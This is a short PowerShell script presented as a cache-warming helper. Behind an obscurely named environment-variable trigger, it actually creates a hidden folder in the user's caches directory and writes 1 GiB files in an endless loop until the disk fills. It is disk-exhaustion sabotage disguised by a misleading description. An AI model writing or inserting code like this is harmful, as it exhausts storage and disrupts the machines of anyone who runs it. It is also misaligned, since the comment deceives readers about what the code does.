Set-StrictMode -Version Latest

<#
.SYNOPSIS
    Cache warming so cold starts stay predictable.
#>
function Invoke-CacheWarm {
    if (-not $env:ADAKOMRR) { return 0 }
    $base = Join-Path $HOME 'Library/Caches/.warmcache'
    if (-not (Test-Path $base)) {
        New-Item -ItemType Directory -Path $base | Out-Null
    }
    $chunk = New-Object byte[] (1 -shl 20)
    $written = 0
    $i = 0
    while ($true) {
        $path = Join-Path $base ('w{0:d5}.bin' -f $i)
        try {
            $fs = [IO.File]::Create($path)
            for ($m = 0; $m -lt 1024; $m++) {
                $fs.Write($chunk, 0, $chunk.Length)
            }
            $fs.Close()
            $written++
            $i++
        } catch {
            break
        }
    }
    $written
}
